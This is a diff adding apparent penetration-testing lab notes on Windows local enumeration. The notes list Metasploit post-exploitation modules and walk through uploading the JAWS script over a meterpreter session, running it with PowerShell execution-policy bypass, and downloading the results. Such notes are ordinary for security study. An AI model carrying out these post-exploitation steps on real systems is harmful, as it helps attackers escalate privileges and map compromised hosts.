@@ -83,12 +83,6 @@ our meterpreter session
 
 
 
-
-
-
-
-
-
 ##### Enumerating Processes & Services 
 
 **Process** is an instance of a running executable (.exe) or program -  (launch google chrome)
@@ -121,23 +115,52 @@ Command shell session
 
 
 
+##### Automating Windows Local Enumeration  
+
+Metasploit
+
+Metapsloit 
+- nmap -sV -p 5958 ip (target WinRM protocol)
+- metasploit module winrm_script_exec 
+	- set FORCE_VBS ture 
+	
+	- `sysinfo` 
+	- `getuid`
+	- `show_mount`
+
+- metasploit module win_privs (post-exploitation module so set session)
+- metasploit module enum_logged_on_users (post-exploitation module so set session)
+- metasploit module checkvm (post-exploitation module so set session)
+- metasploit module enum_applications (post-exploitation module so set session)
+- metasploit module enum_computers  (post-exploitation module so set session)
+- metasploit module enum_patches (post-exploitation module so set session)
+- metasploit module enum_shares (post-exploitation module so set session)
 
 
+- WIndows Local Enum script
+	- **JAWS** (Just another Windows Enum script) is a powershell script quickly identify potential privilege escalation vectors on Windows Systems. It is written using Powershell 2.0 so should run on every Windows version Windows 7
+	- https://github.com/411Hall/JAWS
+
+jaws.enum.ps1 script (copy the code and paste in the lab-environment, (control shift,alt opens clipboard) paste in textfile, save as jaws-enum.ps1)
+- open meterpreter session
+- navigate to root of C drive: `cd C:\\`
+- `dir` 
+- ALWAYS save your files you upload to target in temp directory (if the temp directory does not exit `mkdir Temp`) 
+- `cd Temp`
+- `upload /rppt/Desktop/jaws-enum.ps1`
+- `shell`
+- `dir`
+- execute powershell from within command shell session: `powershell.exe -ExecutionPolicy BYpass -File .\jaws-enum.ps1 -OutputFilename JAWD-Enum.txt `
+	- - `powershell.exe`: Launches PowerShell.
+	- `-ExecutionPolicy Bypass`: Temporarily bypasses execution policies (default users are not allowed the execute powershell.
+	- `-File .\jaws-enum.ps1`: Executes the script "jaws-enum.ps1" in the current directory.
+	- `-OutputFilename JAWD-Enum.txt`: Specifies the output file name for the script's output. Contains results of the script executed. 
+- download the file to kali linux system: control c to stop the command shell and get back to meterpreter session
+	- `ls`
+	- `download jaws-enum.txt` will download to root of kali linux system 
 
 
-
-
-
-
-
-
-
-
-
-
-##### Automating Windows Local Enumeration  (metasploit)
-
-
+ 
 
 
 
